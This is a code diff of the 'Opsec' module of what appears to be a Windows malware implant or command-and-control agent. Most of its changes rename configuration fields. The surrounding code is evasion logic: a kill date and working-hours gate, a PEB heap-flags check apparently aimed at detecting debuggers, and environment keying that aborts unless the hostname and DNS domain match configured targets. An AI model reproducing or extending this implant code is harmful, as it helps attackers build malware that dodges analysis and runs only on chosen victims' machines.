@@ -28,13 +28,13 @@ namespace Opsec {
     BOOL CheckTime() {
         HEXANE
 
-        if (Ctx->Config.Killdate != 0) {
-            if (Utils::Time::GetTimeNow() >= Ctx->Config.Killdate) {
+        if (Ctx->config.killdate != 0) {
+            if (Utils::Time::GetTimeNow() >= Ctx->config.killdate) {
                 Commands::Shutdown(nullptr);
             }
         }
 
-        if (Ctx->Config.WorkingHours != 0) {
+        if (Ctx->config.hours != 0) {
             if (!Utils::Time::InWorkingHours()) {
                 return FALSE;
             }
@@ -49,14 +49,14 @@ namespace Opsec {
         PVOID pHeapBase             = { };
         ULONG HeapFlagsOffset       = 0;
         ULONG HeapForceFlagsOffset  = 0;
-        BOOL VistaOrGreater         = Ctx->Session.OSVersion >= WIN_VERSION_2008;
+        BOOL VistaOrGreater         = Ctx->session.version >= WIN_VERSION_2008;
 
         BOOL m_x32                  = FALSE;
         PPEB pPeb                   = PEB_POINTER;
 
         Ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);
 
-#ifndef _M_AMD64
+#if _WIN64
         pHeapBase = !m_x32
                     ? C_PTR(*(ULONG_PTR*)(B_PTR(pPeb) + 0x18))
                     : C_PTR(*(ULONG_PTR*)(B_PTR(pPeb) + 0x1030));
@@ -104,7 +104,7 @@ namespace Opsec {
         }
 
         if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, R_CAST(LPSTR, buffer), &length)) {
-            if (x_strncmp(Ctx->Config.Hostname, buffer, x_strlen(Ctx->Config.Hostname)) != 0) {
+            if (x_strncmp(Ctx->config.hostname, buffer, x_strlen(Ctx->config.hostname)) != 0) {
                 return_defer(ERROR_BAD_ENVIRONMENT);
             }
             Stream::PackString(out, buffer);
@@ -116,9 +116,9 @@ namespace Opsec {
         x_memset(buffer, 0, MAX_PATH);
         length = MAX_PATH;
 
-        if (Ctx->Transport.Domain[0] != NULTERM) {
+        if (Ctx->transport.domain[0] != NULTERM) {
             if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, R_CAST(LPSTR, buffer), &length)) {
-                if (x_strncmp(Ctx->Transport.Domain, buffer, x_strlen(Ctx->Transport.Domain)) != 0) {
+                if (x_strncmp(Ctx->transport.domain, buffer, x_strlen(Ctx->transport.domain)) != 0) {
                     return_defer(ERROR_BAD_ENVIRONMENT);
                 }
                 Stream::PackString(out, buffer);
